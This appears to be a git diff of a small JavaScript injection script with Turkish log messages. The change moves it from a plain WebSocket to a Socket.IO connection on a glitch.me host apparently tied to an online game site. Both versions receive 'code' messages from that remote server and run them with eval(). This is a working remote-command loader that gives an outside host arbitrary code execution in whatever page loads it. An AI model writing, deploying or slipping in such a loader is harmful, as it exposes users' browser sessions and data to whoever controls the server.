@@ -1,20 +1,21 @@
 (function() {
     console.log('Script yüklendi!');
-    var ws = new WebSocket('wss://adhesive-sassy-spaghetti.glitch.me');
+    var socket = io('https://duello-katiponline-com.glitch.me', {
+        path: '/socket.io',
+        transports: ['websocket'],
+        query: { EIO: 4 }
+    });
     
-    ws.onopen = function() {
-        console.log('WebSocket bağlantısı kuruldu');
-    };
+    socket.on('connect', () => {
+        console.log('Socket.IO bağlantısı kuruldu');
+    });
     
-    ws.onmessage = function(event) {
-        var msg = JSON.parse(event.data);
-        if (msg.type === 'code') {
-            console.log('Yeni kod:', msg.data);
-            eval(msg.data);
-        }
-    };
+    socket.on('code', (newCode) => {
+        console.log('Yeni kod:', newCode);
+        eval(newCode);
+    });
     
-    ws.onerror = function(error) {
-        console.error('WebSocket hatası:', error);
-    };
+    socket.on('connect_error', (error) => {
+        console.error('Bağlantı hatası:', error);
+    });
 })();
